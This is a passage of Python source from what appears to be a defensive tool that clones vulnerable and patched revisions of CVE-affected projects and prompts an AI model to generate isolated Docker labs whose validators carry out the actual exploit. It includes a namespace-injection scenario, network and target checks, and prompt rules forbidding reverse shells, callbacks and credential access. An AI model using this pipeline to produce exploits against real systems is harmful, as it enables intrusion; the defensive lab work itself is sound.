        if path == "validator/Dockerfile" and re.search(
            r"(?mi)^\s*COPY\s+(?:\./)?(?:validator|adapter)/validator\.py\s+",
            item["content"],
        ):
            raise RuntimeError(
                "Validator Dockerfile COPY source must be relative to the ./validator build context"
            )
        if path == "docker-compose.yml":
            if "internal: true" not in lowered:
                raise RuntimeError("Compose network must be internal")
            if re.search(r"(?m)^\s*ports\s*:", lowered) or re.search(r"(?m)^\s*volumes\s*:", lowered):
                raise RuntimeError("Compose ports and volume mounts are not allowed in source labs")
            required_builds = ["dockerfile: vulnerable/dockerfile", "context: ./validator"]
            if not vulnerable_only:
                required_builds.append("dockerfile: patched/dockerfile")
            for required_build in required_builds:
                if required_build not in lowered:
                    raise RuntimeError(f"Compose build layout is invalid: missing {required_build}")
        if path == "validator/validator.py":
            required_contract = {
                "attack_executed", "proof_quality", "observable_effect", "evidence_type",
                "vulnerable", "differential_confirmed",
            }
            if vulnerable_only:
                required_contract.update({"patched_tested", "fix_status"})
            else:
                required_contract.add("patched")
            missing_contract = {field for field in required_contract if field not in item["content"]}
            if missing_contract:
                raise RuntimeError(
                    "Validator is missing real-PoC evidence fields: "
                    + ", ".join(sorted(missing_contract))
                )
            if "confirmed" not in item["content"] or (
                not vulnerable_only and "blocked" not in item["content"]
            ):
                raise RuntimeError(
                    "Validator must emit nested vulnerable/patched evidence with confirmed and blocked fields"
                )
            manual_contract = {
                "CVELAB_MANUAL_ACTION", "CVELAB_TARGET", "exploit", "verify",
            }
            missing_manual = {
                field for field in manual_contract if field not in item["content"]
            }
            if missing_manual:
                raise RuntimeError(
                    "Validator is missing the manual PoC contract: "
                    + ", ".join(sorted(missing_manual))
                )
            if re.search(
                r"['\"](?:attack_executed|confirmed|differential_confirmed)['\"]\s*:\s*True\b",
                item["content"],
            ):
                raise RuntimeError("Validator contains a hard-coded successful exploit result")
            for url in re.findall(r"https?://([^/'\"\s:]+)", lowered):
                allowed_hosts = {"vulnerable", "127.0.0.1", "localhost"}
                if not vulnerable_only:
                    allowed_hosts.add("patched")
                if url not in allowed_hosts:
                    raise RuntimeError(f"Validator external target rejected: {url}")


def _validate_fidelity(fidelity: dict) -> None:
    level = fidelity.get("execution_level")
    product_started = fidelity.get("vendor_product_started")
    exercised = fidelity.get("exercised_vendor_components")
    simulated = fidelity.get("simulated_components")
    if level == "source_component" and product_started is not False:
        raise RuntimeError("source_component fidelity cannot claim that the vendor product started")
    if level == "vendor_service" and product_started is not True:
        raise RuntimeError("vendor_service fidelity requires the actual vendor product to start")
    if level == "product_end_to_end" and product_started is not True:
        raise RuntimeError("product_end_to_end fidelity requires the actual vendor product to start")
    if not isinstance(exercised, list) or not exercised:
        raise RuntimeError("Fidelity must name at least one exercised vendor component")
    if not isinstance(simulated, list):
        raise RuntimeError("Fidelity simulated_components must be a list")


def _validate_support_services(services: list[str], compose: str) -> None:
    reserved = {"vulnerable", "patched", "validator"}
    if len(services) != len(set(services)) or reserved.intersection(services):
        raise RuntimeError("Support service names must be unique and cannot use reserved names")
    for service in services:
        if not re.search(rf"(?m)^  {re.escape(service)}:\s*$", compose):
            raise RuntimeError(f"Compose support service is missing: {service}")


def _generate_curated_lighthouse(
    cve: str,
    dossier: dict,
    repository: Path,
    repo_url: str,
    vulnerable: str,
    fixed: str,
    marker: str,
    output_root: Path,
) -> dict:
    lab_dir = output_root.resolve() / cve
    _snapshot(repository, vulnerable, lab_dir / "source" / "vulnerable")
    _snapshot(repository, fixed, lab_dir / "source" / "patched")
    write_text(lab_dir / "adapter" / "vulnerable_poc_test.go", LIGHTHOUSE_VULNERABLE_TEST)
    write_text(lab_dir / "adapter" / "patched_poc_test.go", LIGHTHOUSE_PATCHED_TEST)
    write_text(lab_dir / "adapter" / "health.py", SOURCE_HEALTH_PY)
    write_text(lab_dir / "validator" / "validator.py", LIGHTHOUSE_VALIDATOR_PY)
    write_text(lab_dir / "e2e" / "poc.yaml", LIGHTHOUSE_E2E_POC_YAML)
    write_text(lab_dir / "e2e" / "run.sh", LIGHTHOUSE_E2E_RUN_SH)
    write_text(lab_dir / "e2e" / "manual.sh", LIGHTHOUSE_MANUAL_POC_SH)
    vulnerable_dockerfile = '''FROM golang:1.26 AS validation
WORKDIR /src
COPY source/vulnerable/ ./
COPY adapter/vulnerable_poc_test.go pkg/agent/controller/cvelab_poc_test.go
RUN go test ./pkg/agent/controller -run '^TestCVELabNamespaceInjection$' -count=1 -v
RUN touch /source-test-passed
FROM python:3.13-alpine
WORKDIR /app
COPY adapter/health.py /app/health.py
COPY --from=validation /source-test-passed /app/source-test-passed
RUN addgroup -S lab && adduser -S lab -G lab && chown -R lab:lab /app
USER lab
CMD ["python", "/app/health.py"]
'''
    patched_dockerfile = vulnerable_dockerfile.replace(
        "source/vulnerable/", "source/patched/"
    ).replace("vulnerable_poc_test.go", "patched_poc_test.go")
    validator_dockerfile = '''FROM python:3.13-alpine
WORKDIR /validator
COPY validator/validator.py /validator/validator.py
RUN addgroup -S validator && adduser -S validator -G validator && chown -R validator:validator /validator
USER validator
CMD ["python", "/validator/validator.py"]
'''
    compose = '''services:
  vulnerable:
    build:
      context: .
      dockerfile: vulnerable/Dockerfile
    networks: [labnet]
    security_opt: ["no-new-privileges:true"]
    healthcheck:
      test: ["CMD", "python", "-c", "import urllib.request; urllib.request.urlopen('http://127.0.0.1:8080/health')"]
      interval: 2s
      timeout: 2s
      retries: 20
  patched:
    build:
      context: .
      dockerfile: patched/Dockerfile
    networks: [labnet]
    security_opt: ["no-new-privileges:true"]
    healthcheck:
      test: ["CMD", "python", "-c", "import urllib.request; urllib.request.urlopen('http://127.0.0.1:8080/health')"]
      interval: 2s
      timeout: 2s
      retries: 20
  validator:
    profiles: ["tools"]
    build:
      context: .
      dockerfile: validator/Dockerfile
    depends_on:
      vulnerable: {condition: service_healthy}
      patched: {condition: service_healthy}
    networks: [labnet]
    security_opt: ["no-new-privileges:true"]
    volumes:
      - ./e2e:/e2e:ro
networks:
  labnet:
    internal: true
'''
    write_text(lab_dir / "vulnerable" / "Dockerfile", vulnerable_dockerfile)
    write_text(lab_dir / "patched" / "Dockerfile", patched_dockerfile)
    write_text(lab_dir / "validator" / "Dockerfile", validator_dockerfile)
    write_text(lab_dir / "docker-compose.yml", compose)
    write_text(lab_dir / ".dockerignore", ".git\nartifacts\nreport.json\n")
    plan = {
        "cve": cve,
        "cwe": "CWE-284",
        "lab_type": "END_TO_END_REPRODUCTION",
        "marker": marker,
        "scenario": "lighthouse_broker_namespace_injection_e2e",
        "repository": repo_url,
        "revisions": {"vulnerable": vulnerable, "patched": fixed},
        "source_provenance": CURATED_SOURCES[cve]["provenance"],
        "runner": {
            "type": "shipyard",
            "distribution": "kali-linux",
            "script": "e2e/run.sh",
        },
        "safety": {
            "target_scope": "ephemeral_local_kind_clusters_only",
            "payload": "non_destructive_endpointslice_namespace_injection",
            "limitations": "Uses disposable local clusters and a documentation-only TEST-NET address; no remote target option.",
        },
        "exploit_contract": {
            "attack_summary": "Create a crafted EndpointSlice in a compromised spoke and let the real agent/broker flow propagate it to a peer kube-system namespace.",
            "preconditions": ["Attacker controls one spoke cluster in the disposable local cluster set"],
            "observable_effect": "The peer cluster contains the attacker-created EndpointSlice in kube-system.",
            "evidence_type": "authorization_bypass",
        },
        "fidelity": {
            "execution_level": "product_end_to_end",
            "vendor_product_started": True,
            "exercised_vendor_components": [
                "upstream Lighthouse agent",
                "upstream Lighthouse broker",
                "Kubernetes API",
            ],
            "simulated_components": [],
            "rationale": (
                "The recorded upstream revisions run through the real two-cluster "
                "agent and broker flow."
            ),
        },
        "generation": {"model": None, "confidence": 1.0, "rationale": "Deterministic curated upstream two-cluster E2E profile"},
    }
    write_text(lab_dir / "dossier.json", json.dumps(dossier, indent=2, ensure_ascii=True) + "\n")
    write_text(lab_dir / "plan.json", json.dumps(plan, indent=2, ensure_ascii=True) + "\n")
    write_text(lab_dir / "validator" / "plan.json", json.dumps(plan, indent=2, ensure_ascii=True) + "\n")
    return {"ok": True, "status": "GENERATED_UNVALIDATED", "lab_dir": str(lab_dir), "plan": plan}


def generate_source_lab(
    cve_value: str,
    output_root: Path,
    repo: str | None,
    fixed_ref: str | None,
    vulnerable_ref: str | None,
    api_key: str | None,
    model: str | None,
) -> dict:
    cve = normalize_cve(cve_value)
    dossier = collect_cve(cve)
    resolved = resolve_source(dossier, repo, fixed_ref)
    vulnerable_only_resolved = None
    if repo and vulnerable_ref and not fixed_ref:
        vulnerable_only_resolved = (_safe_repo_url(repo), vulnerable_ref)
    discovery = None
    effective_key = api_key or os.getenv("OPENAI_API_KEY")
    effective_model = model or os.getenv("CVELAB_MODEL")
    if not resolved and effective_key and effective_model:
        discovery = discover_source_with_openai(dossier, api_key, model)
        if discovery["status"] == "SOURCE_READY":
            candidate_repo = discovery.get("repository_url")
            candidate_fixed = discovery.get("fixed_ref")
            if candidate_repo and candidate_fixed:
                resolved = (_safe_repo_url(candidate_repo), candidate_fixed)
                vulnerable_ref = vulnerable_ref or discovery.get("vulnerable_ref")
        elif discovery["status"] == "VULNERABLE_ONLY":
            candidate_repo = discovery.get("repository_url")
            candidate_vulnerable = discovery.get("vulnerable_ref")
            if candidate_repo and candidate_vulnerable:
                vulnerable_only_resolved = (
                    _safe_repo_url(candidate_repo), candidate_vulnerable
                )
    if not resolved and not vulnerable_only_resolved:
        status = discovery.get("status") if discovery else "INSUFFICIENT_DATA"
        if status == "VENDOR_ARTIFACT_REQUIRED":
            return {
                "ok": False,
                "status": "VENDOR_ARTIFACT_REQUIRED",
                "cve": cve,
                "reason": discovery["rationale"],
                "required": [discovery.get("vendor_artifact") or "Authorized affected vendor artifact"],
                "evidence_urls": discovery.get("evidence_urls", []),
            }
        return {
            "ok": False,
            "status": "ARTIFACT_REQUIRED",
            "cve": cve,
            "reason": discovery["rationale"] if discovery else "No public source repository and fixed commit were found.",
            "required": [
                "Verified public repository and immutable affected revision; fixed revision when available"
            ],
            "evidence_urls": discovery.get("evidence_urls", []) if discovery else [],
        }
    vulnerable_only = resolved is None
    if vulnerable_only:
        repo_url, vulnerable = vulnerable_only_resolved
        fixed = None
    else:
        repo_url, fixed = resolved
    curated = CURATED_SOURCES.get(cve)
    if curated and not vulnerable_ref:
        vulnerable_ref = curated["vulnerable_ref"]
    cache_key = hashlib.sha256(repo_url.encode()).hexdigest()[:16]
    repository = output_root.resolve() / ".source-cache" / cache_key
    repository.parent.mkdir(parents=True, exist_ok=True)
    if not repository.exists():
        _run_git(["clone", "--filter=blob:none", "--no-checkout", repo_url, str(repository)])
    else:
        _run_git(["fetch", "--force", "origin"], cwd=repository)
    if fixed:
        _run_git(["fetch", "--force", "origin", fixed], cwd=repository)
        _run_git(["rev-parse", "--verify", f"{fixed}^{{commit}}"], cwd=repository)
        vulnerable = vulnerable_ref or f"{fixed}^"
    else:
        _run_git(["fetch", "--force", "origin", vulnerable], cwd=repository)
    _run_git(["rev-parse", "--verify", f"{vulnerable}^{{commit}}"], cwd=repository)

    marker = "CVELAB-" + uuid.uuid4().hex
    if vulnerable_only:
        context = _source_context(repository, vulnerable, vulnerable, dossier)
        context += (
            "\n\n--- FIX STATUS ---\nNo public fixed revision was identified at generation time. "
            "Generate and validate only the authentic vulnerable source. Do not invent a patched service."
        )
        generation = structured_response(
            api_key=api_key,
            model=model,
            schema=VULNERABLE_ONLY_SCHEMA,
            schema_name="cvelab_vulnerable_only_adapter",
            max_output_tokens=12000,
            instructions=(
                "Create a reproducible vulnerable-only adapter for an authorized, local-only defensive CVE lab. "
                "Populate every required field and put additional files only under adapter/. Never invent a fix, "
                "patched source tree, patched image, or patched service. Compose must contain services named "
                "vulnerable and validator on an internal Docker network, with no host ports or host mounts. The "
                "vulnerable image must build source/vulnerable, run non-root, and expose only the application path "
                "needed by the validator. The validator must execute the actual vulnerable path and prove a concrete "
                "security effect, not marker reflection. It must print JSON containing attack_executed, proof_quality "
                "set to security_effect_observed, observable_effect, evidence_type, vulnerable as an object with a "
                "computed confirmed field and raw observations, patched_tested set to false, differential_confirmed "
                "set to false, and fix_status set to PUBLIC_FIX_NOT_IDENTIFIED. Exit zero only when the vulnerable "
                "security effect is genuinely observed. Never hard-code attack_executed or vulnerable.confirmed. "
                "The validator must also implement manual mode selected with CVELAB_MANUAL_ACTION and CVELAB_TARGET. "
                "Action exploit executes the exact attack against target vulnerable and prints its raw observation; "
                "action verify independently evaluates that target and prints REPRODUCED only when confirmed. With "
                "neither variable set it must retain automatic JSON validation. Populate fidelity honestly: choose "
                "source_component when an adapter invokes selected vendor code, vendor_service when the actual vendor "
                "service/binary starts, or product_end_to_end only when the complete security-relevant request path "
                "runs through the real product. List every simulated policy, peer, backend, or downstream component. "
                "List every additional Compose dependency in support_services so the runner builds and starts it. "
                f"A harmless canary ({marker}) may identify affected data. No reverse shells, callbacks, persistence, "
                "credential access, destructive operations, Docker socket, privileged mode, capabilities, or remote "
                "target option. If command execution is intrinsic, restrict it to a canary file inside the vulnerable "
                "container. Normalize CRLF for copied scripts. Source archives contain no .git directory, so initialize "
                "a local repository with no remote only if the build requires git. Healthchecks must verify the final "
                "application route without accepting redirects."
            ),
            input_text=context,
        )
        generated_files = [
            {
                "path": "docker-compose.yml",
                "content": _canonicalize_compose_builds(
                    generation["docker_compose"], vulnerable_only=True
                ),
            },
            {"path": ".dockerignore", "content": generation["dockerignore"]},
            {"path": "vulnerable/Dockerfile", "content": generation["vulnerable_dockerfile"]},
            {
                "path": "validator/Dockerfile",
                "content": _canonicalize_validator_dockerfile(generation["validator_dockerfile"]),
            },
            {"path": "validator/validator.py", "content": generation["validator_py"]},
            *generation["adapter_files"],
        ]
        _validate_generated(generated_files, vulnerable_only=True)
        _validate_fidelity(generation["fidelity"])
        _validate_support_services(generation["support_services"], generation["docker_compose"])
        lab_dir = output_root.resolve() / cve
        _snapshot(repository, vulnerable, lab_dir / "source" / "vulnerable")
        for item in generated_files:
            write_text(lab_dir / item["path"], item["content"])
        plan = {
            "cve": cve,
            "cwe": generation["cwe"],
            "lab_type": "VULNERABLE_ONLY_REPRODUCTION",
            "marker": marker,
            "repository": repo_url,
            "revisions": {"vulnerable": vulnerable, "patched": None},
            "fix_status": "PUBLIC_FIX_NOT_IDENTIFIED",
            "patched_tested": False,
            "startup_services": [*generation["support_services"], "vulnerable"],
            "source_provenance": "Public vulnerable source resolved from CVE discovery or explicit override",
            "safety": {
                "target_scope": "internal_docker_network_only",
                "payload": "non_destructive_exploit_canary",
                "limitations": "No public fixed revision was identified; remediation behavior was not tested.",
            },
            "exploit_contract": generation["exploit_contract"],
            "fidelity": generation["fidelity"],
            "generation": {
                "model": model,
                "confidence": generation["confidence"],
                "rationale": generation["rationale"],
                "discovery_evidence_urls": discovery.get("evidence_urls", []) if discovery else [],
            },
        }
        write_text(lab_dir / "dossier.json", json.dumps(dossier, indent=2, ensure_ascii=True) + "\n")
        write_text(lab_dir / "plan.json", json.dumps(plan, indent=2, ensure_ascii=True) + "\n")
        write_text(lab_dir / "validator" / "plan.json", json.dumps(plan, indent=2, ensure_ascii=True) + "\n")
        return {
            "ok": True,
            "status": "GENERATED_UNVALIDATED",
            "fix_status": "PUBLIC_FIX_NOT_IDENTIFIED",
            "lab_dir": str(lab_dir),
            "plan": plan,
        }
    if cve == "CVE-2026-66788":
        return _generate_curated_lighthouse(
            cve, dossier, repository, repo_url, vulnerable, fixed, marker, output_root
        )
    context = _source_context(repository, vulnerable, fixed, dossier)
    generation = structured_response(
        api_key=api_key,
        model=model,
        schema=SOURCE_SCHEMA,
        schema_name="cvelab_source_adapter",
        max_output_tokens=14000,
        instructions=(
            "Create a reproducible adapter for an authorized, local-only defensive CVE lab from the supplied "
            "security patch and source metadata. Populate every required Docker, Compose, and validator field; "
            "put only additional files under adapter_files with adapter/ paths. Never return vendor source. The two Docker "
            "builds must use source/vulnerable and source/patched, run as non-root, have no host ports or host "
            "mounts, and share an internal Docker network. Compose services must be named vulnerable, patched, "
            "and validator. The validator must execute the actual vulnerable code path and demonstrate a concrete "
            "security effect such as unauthorized read/write, authorization bypass, request forgery, or contained "
            "command execution. It must print JSON containing attack_executed, proof_quality set to "
            "security_effect_observed, observable_effect, evidence_type, vulnerable, patched, and "
            "differential_confirmed, exiting zero only when the effect occurs on vulnerable and is blocked on "
            "patched. vulnerable and patched must each be JSON objects. vulnerable.confirmed is true only when "
            "the security effect is observed. patched.confirmed is false and patched.blocked is true only when "
            "the same attack is demonstrably blocked. Include raw observations in those objects. Never hard-code "
            "a successful result. The validator must also implement manual mode using CVELAB_MANUAL_ACTION and "
            "CVELAB_TARGET. Action exploit sends the exact attack only to the selected vulnerable or patched service "
            "and prints its raw observation. Action verify independently evaluates that target and prints REPRODUCED "
            "for a confirmed vulnerable target or BLOCKED for a confirmed patched target. With neither variable set, "
            "retain automatic differential JSON validation. Prefer running the actual vendor service or binary whenever "
            "the repository permits it. Populate fidelity honestly: choose source_component when only selected vendor "
            "functions are wrapped, vendor_service when the actual vendor service/binary starts but part of the "
            "security path is simulated, or product_end_to_end only when the complete security-relevant request path "
            "runs through the real product. List every simulated authorization, routing, backend, peer, or downstream "
            "component. "
            "List every additional Compose dependency in support_services so the runner builds and starts it. "
            f"A harmless canary marker ({marker}) may identify affected data, but marker reflection alone is not proof. No reverse shells, callbacks, persistence, "
            "credential access, destructive operations, Docker socket, privileged mode, extra capabilities, or "
            "remote target option. If command execution is intrinsic to the CVE, restrict it to creating a canary "
            "file inside the vulnerable container and verify that file as the observable effect. Dockerfiles may install build dependencies from normal package "
            "registries. Source snapshots are materialized on Windows, so normalize CRLF on copied shell scripts "
            "before executing them (including gradlew and entrypoints). Before using a Gradle wrapper, verify from "
            "the repository tree that gradle/wrapper/gradle-wrapper.jar is versioned. If it is absent, install the "
            "exact Gradle version declared by gradle-wrapper.properties and invoke gradle directly. Include USER "
            "and no-new-privileges controls. Source archives intentionally contain no .git directory; if build "
            "logic invokes git or configures git hooks, install git and initialize a local repository with no remote "
            "before running the build. Apply the same Gradle decision to runtime entrypoint scripts; they must not "
            "invoke ./gradlew when the wrapper JAR is absent. Healthchecks must reach the final application route "
            "without treating an HTTP redirect as healthy, and the validator must use the same final scheme/port."
        ),
        input_text=context,
    )
    generated_files = [
        {
            "path": "docker-compose.yml",
            "content": _canonicalize_compose_builds(generation["docker_compose"]),
        },
        {"path": ".dockerignore", "content": generation["dockerignore"]},
        {"path": "vulnerable/Dockerfile", "content": generation["vulnerable_dockerfile"]},
        {"path": "patched/Dockerfile", "content": generation["patched_dockerfile"]},
        {
            "path": "validator/Dockerfile",
            "content": _canonicalize_validator_dockerfile(generation["validator_dockerfile"]),
        },
        {"path": "validator/validator.py", "content": generation["validator_py"]},
        *generation["adapter_files"],
    ]
    _validate_generated(generated_files)
    _validate_fidelity(generation["fidelity"])
    _validate_support_services(generation["support_services"], generation["docker_compose"])

    lab_dir = output_root.resolve() / cve
    _snapshot(repository, vulnerable, lab_dir / "source" / "vulnerable")
    _snapshot(repository, fixed, lab_dir / "source" / "patched")
    for item in generated_files:
        write_text(lab_dir / item["path"], item["content"])
    plan = {
        "cve": cve,
        "cwe": generation["cwe"],
        "lab_type": (
            "END_TO_END_REPRODUCTION"
            if generation["fidelity"]["execution_level"] == "product_end_to_end"
            else "SOURCE_REPRODUCTION"
        ),
        "marker": marker,
        "repository": repo_url,
        "revisions": {"vulnerable": vulnerable, "patched": fixed},
        "source_provenance": curated.get("provenance") if curated else "CVE reference or explicit user override",
        "startup_services": [*generation["support_services"], "vulnerable", "patched"],
        "safety": {
            "target_scope": "internal_docker_network_only",
            "payload": "non_destructive_exploit_canary",
            "limitations": "Generated from a public security patch; validation is required before claiming reproduction.",
        },
        "exploit_contract": generation["exploit_contract"],
        "fidelity": generation["fidelity"],
        "generation": {
            "model": model,
            "confidence": generation["confidence"],
            "rationale": generation["rationale"],
        },
    }
    write_text(lab_dir / "dossier.json", json.dumps(dossier, indent=2, ensure_ascii=True) + "\n")
    write_text(lab_dir / "plan.json", json.dumps(plan, indent=2, ensure_ascii=True) + "\n")
    write_text(lab_dir / "validator" / "plan.json", json.dumps(plan, indent=2, ensure_ascii=True) + "\n")
    return {"ok": True, "status": "GENERATED_UNVALIDATED", "lab_dir": str(lab_dir), "plan": plan}


def _repair_material(lab_dir: Path) -> dict[str, str]:
    """Return only generated adapter inputs, never the vendor source snapshots."""
    candidates = [
        lab_dir / "docker-compose.yml",
        lab_dir / ".dockerignore",
        lab_dir / "vulnerable" / "Dockerfile",
        lab_dir / "patched" / "Dockerfile",
        lab_dir / "validator" / "Dockerfile",
        lab_dir / "validator" / "validator.py",
    ]
    adapter_dir = lab_dir / "adapter"
    if adapter_dir.is_dir():
        candidates.extend(sorted(path for path in adapter_dir.iterdir() if path.is_file()))
    material = {}
    for path in candidates:
        if not path.is_file():
            continue
        relative = path.relative_to(lab_dir).as_posix()
        if ALLOWED_GENERATED.fullmatch(relative):
            material[relative] = path.read_text(encoding="utf-8", errors="replace")[:30000]
    return material


def repair_source_lab(
    cve_value: str,
    output_root: Path,
    failure: dict,
    attempt: int,
    api_key: str | None,
    model: str | None,
) -> dict:
    """Regenerate a failed source adapter using its observed runtime diagnostics."""
    cve = normalize_cve(cve_value)
    lab_dir = output_root.resolve() / cve
    plan_path = lab_dir / "plan.json"
    dossier_path = lab_dir / "dossier.json"
    if not plan_path.is_file() or not dossier_path.is_file():
        raise RuntimeError("Automatic repair requires an existing generated source lab")
    plan = json.loads(plan_path.read_text(encoding="utf-8"))
    if plan.get("runner"):
        raise RuntimeError("Curated runners are deterministic and cannot be AI-repaired")
    dossier = json.loads(dossier_path.read_text(encoding="utf-8"))
    repo_url = plan.get("repository")
    revisions = plan.get("revisions", {})
    vulnerable = revisions.get("vulnerable")
    fixed = revisions.get("patched")
    if not repo_url or not vulnerable:
        raise RuntimeError("Automatic repair is missing repository provenance")
    cache_key = hashlib.sha256(repo_url.encode()).hexdigest()[:16]
    repository = output_root.resolve() / ".source-cache" / cache_key
    if not repository.is_dir():
        raise RuntimeError(f"Automatic repair source cache is missing: {repository}")

    vulnerable_only = fixed is None
    context = _source_context(repository, vulnerable, fixed or vulnerable, dossier)
    diagnostic = json.dumps(failure, ensure_ascii=True, indent=2)[:40000]
    current = json.dumps(_repair_material(lab_dir), ensure_ascii=True, indent=2)[:100000]
    variant_contract = (
        "This is vulnerable-only: do not create a patched image or service. Emit patched_tested=false, "
        "differential_confirmed=false, and fix_status=PUBLIC_FIX_NOT_IDENTIFIED."
        if vulnerable_only
        else
        "Test the identical attack against vulnerable and patched services. Success requires the effect on "
        "vulnerable, its absence on patched, patched.blocked=true, and differential_confirmed=true."
    )
    generation = structured_response(
        api_key=api_key,
        model=model,
        schema=VULNERABLE_ONLY_SCHEMA if vulnerable_only else SOURCE_SCHEMA,
        schema_name="cvelab_autonomous_adapter_repair",
        max_output_tokens=16000,
        instructions=(
            "Repair the complete adapter for an authorized local-only defensive CVE lab. The observed failure and "
            "container logs are authoritative: identify their root cause and return a full replacement, not a patch. "
            "Do not repeat the failing design when the diagnostics disprove it. Build and run the supplied immutable "
            "vendor source snapshots; never modify or return vendor source. Prefer the actual vendor service or binary. "
            "Use source_component only if launching the product is genuinely impractical, vendor_service when the real "
            "service starts with simulated surrounding components, and product_end_to_end only when the complete "
            "security-relevant product path executes. Disclose every simulated component. Compose must use an internal "
            "network, no host ports or mounts, services named vulnerable, patched where applicable, and validator, and "
            "list all extra services in support_services. Run containers non-root with no-new-privileges. The automatic "
            "validator must perform the attack, derive its booleans from raw observations, print one JSON document with "
            "attack_executed, proof_quality=security_effect_observed, observable_effect, evidence_type, vulnerable, and "
            "the required comparison fields, and exit zero only on genuine proof. It must also support independently "
            "runnable CVELAB_MANUAL_ACTION=exploit|verify and CVELAB_TARGET=vulnerable|patched modes; exploit prints raw "
            "evidence and verify prints REPRODUCED or BLOCKED only after evaluating a fresh request. Never hard-code a "
            "successful result or treat canary reflection alone as proof. Preserve the exploit contract unless runtime "
            "evidence shows it is technically wrong. No remote target option, callbacks, reverse shells, persistence, "
            "credential access, destructive operations, Docker socket, privileged mode, or extra capabilities. "
            + variant_contract
        ),
        input_text=(
            context
            + "\n\n--- FAILED ADAPTER ---\n"
            + current
            + "\n\n--- OBSERVED FAILURE (AUTOMATIC ATTEMPT "
            + str(attempt)
            + ") ---\n"
            + diagnostic
        ),
    )
    compose = _canonicalize_compose_builds(
        generation["docker_compose"], vulnerable_only=vulnerable_only
    )
    generated_files = [
        {"path": "docker-compose.yml", "content": compose},
        {"path": ".dockerignore", "content": generation["dockerignore"]},
        {"path": "vulnerable/Dockerfile", "content": generation["vulnerable_dockerfile"]},
        {
            "path": "validator/Dockerfile",
            "content": _canonicalize_validator_dockerfile(generation["validator_dockerfile"]),
        },
        {"path": "validator/validator.py", "content": generation["validator_py"]},
    ]
    if not vulnerable_only:
        generated_files.insert(
            3,
            {"path": "patched/Dockerfile", "content": generation["patched_dockerfile"]},
        )
    generated_files.extend(generation["adapter_files"])
    _validate_generated(generated_files, vulnerable_only=vulnerable_only)
    _validate_fidelity(generation["fidelity"])
    _validate_support_services(generation["support_services"], compose)

    new_paths = {item["path"].replace("\\", "/") for item in generated_files}
    adapter_dir = lab_dir / "adapter"
    if adapter_dir.is_dir():
        for old_file in adapter_dir.iterdir():
            relative = old_file.relative_to(lab_dir).as_posix()
            if old_file.is_file() and ALLOWED_GENERATED.fullmatch(relative) and relative not in new_paths:
                old_file.unlink()
    for item in generated_files:
        write_text(lab_dir / item["path"], item["content"])

    history = plan.get("generation", {}).get("repair_history", [])
    history.append({
        "attempt": attempt,
        "model": model or os.getenv("CVELAB_MODEL"),
        "failure": diagnostic[:8000],
        "confidence": generation["confidence"],
        "rationale": generation["rationale"],
    })
    plan["cwe"] = generation["cwe"]
    if not vulnerable_only:
        plan["lab_type"] = (
            "END_TO_END_REPRODUCTION"
            if generation["fidelity"]["execution_level"] == "product_end_to_end"
            else "SOURCE_REPRODUCTION"
        )
    plan["startup_services"] = [
        *generation["support_services"], "vulnerable",
        *([] if vulnerable_only else ["patched"]),
    ]
    plan["exploit_contract"] = generation["exploit_contract"]
    plan["fidelity"] = generation["fidelity"]
    plan["generation"] = {
        **plan.get("generation", {}),
        "model": model or os.getenv("CVELAB_MODEL"),
        "confidence": generation["confidence"],
        "rationale": generation["rationale"],
        "repair_history": history,
    }
    write_text(plan_path, json.dumps(plan, indent=2, ensure_ascii=True) + "\n")
    write_text(lab_dir / "validator" / "plan.json", json.dumps(plan, indent=2, ensure_ascii=True) + "\n")
    return {
        "ok": True,
        "status": "REPAIRED_UNVALIDATED",
        "attempt": attempt,
        "lab_dir": str(lab_dir),
        "plan": plan,
    }
